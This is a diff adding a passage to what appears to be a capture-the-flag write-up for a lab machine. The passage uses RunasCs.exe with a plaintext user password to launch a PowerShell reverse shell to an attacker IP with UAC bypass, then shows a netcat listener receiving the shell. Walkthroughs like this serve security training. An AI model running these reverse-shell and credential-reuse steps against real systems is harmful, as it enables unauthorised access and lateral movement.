@@ -903,6 +903,33 @@ Unknown     : qT3V9pLXyN7W4m
 
 
 ```
+
+```
+PS C:\tmp> .\RunasCs.exe jeremy.combs qT3V9pLXyN7W4m  powershell -r 10.10.15.74:4445 --bypass-uac
+.\RunasCs.exe jeremy.combs qT3V9pLXyN7W4m  powershell -r 10.10.15.74:4445 --bypass-uac
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-c9536$\Default
+[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 2476 created in background.
+PS C:\tmp> 
+
+```
+
+```
+rlwrap -cAr nc -lvnp 4445                                  
+listening on [any] 4445 ...
+connect to [10.10.15.74] from (UNKNOWN) [10.129.232.130] 53203
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\system32> whoami
+whoami
+voleur\jeremy.combs
+PS C:\Windows\system32> 
+
+```
 ---
 ## Privilege Escalation
 
